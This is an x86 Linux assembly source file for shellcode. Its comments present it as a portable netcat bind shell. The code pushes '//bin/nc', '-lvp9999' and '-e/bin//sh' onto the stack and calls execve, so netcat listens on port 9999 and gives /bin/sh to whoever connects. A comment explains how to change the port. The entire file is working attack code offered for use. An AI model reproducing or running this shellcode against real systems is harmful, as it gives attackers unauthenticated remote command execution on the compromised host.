;This shellcode uses nc to create a bindshell.
;It writes all the code straight to the stack, in order to make it portable.
;
;
;



global _start
section .text
_start:

    xor eax,eax
    xor ebx,ebx

    ; //bin/nc
    push eax
    push 0x636e2f6e
    push 0x69622f2f
    mov ebx,esp


    ;-lvp9999
    push eax
    ;change these to change port
    push 0x39393939
    push 0x70766c2d
    mov ecx,esp

    ;-e/bin////sh
    push eax
    push 0x68732f2f
    push 0x2f6e6962
    push 0x2f20652d
    mov edx,esp

    push eax
    push ecx
    push edx
    push ebx
    mov ecx,esp
    mov edx,eax

    mov al,0xb
    int 0x80
